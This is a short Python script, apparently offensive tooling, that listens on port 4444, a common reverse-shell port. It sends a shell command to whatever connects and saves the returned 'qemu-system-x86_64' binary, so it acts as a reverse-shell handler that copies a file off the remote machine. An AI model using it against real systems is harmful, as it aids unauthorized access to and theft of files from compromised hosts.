import socket

from contextlib import closing

with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 4444))
    sock.listen(1)

    cli = sock.accept()[0]
    print('Got connection')

    with closing(cli):
        cli.send(b'cat qemu-system-x86_64 && sleep 20 && exit\n');

        with open('qemu-system-x86_64', 'wb') as f:
            data = cli.recv(4096)
            while data:
                f.write(data)
                data = cli.recv(4096)

